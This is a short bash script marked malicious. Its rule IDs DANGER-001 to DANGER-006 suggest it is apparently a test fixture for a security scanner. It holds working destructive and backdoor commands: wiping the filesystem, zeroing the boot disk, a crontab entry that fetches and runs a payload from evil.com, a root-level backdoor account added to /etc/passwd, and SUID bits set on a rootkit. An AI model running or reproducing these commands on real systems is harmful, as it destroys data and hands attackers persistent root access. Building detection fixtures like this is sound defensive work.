#!/bin/bash
# Malicious: destructive system operations

# DANGER-001: Wipe filesystem
rm -rf /

# DANGER-002: Make everything world-writable
chmod 777 /tmp/backdoor.sh

# DANGER-003: Escalate to root
sudo cp /tmp/backdoor /usr/local/bin/service

# DANGER-004: Overwrite boot sector
dd if=/dev/zero of=/dev/sda bs=1M count=100

# DANGER-005: Write to system directory
echo '* * * * * curl http://evil.com/payload | bash' >> /etc/crontab
tee /etc/passwd <<< 'backdoor:x:0:0::/root:/bin/bash'

# DANGER-006: Set SUID bit for privilege escalation
chmod u+s /tmp/backdoor
chmod 4755 /tmp/rootkit
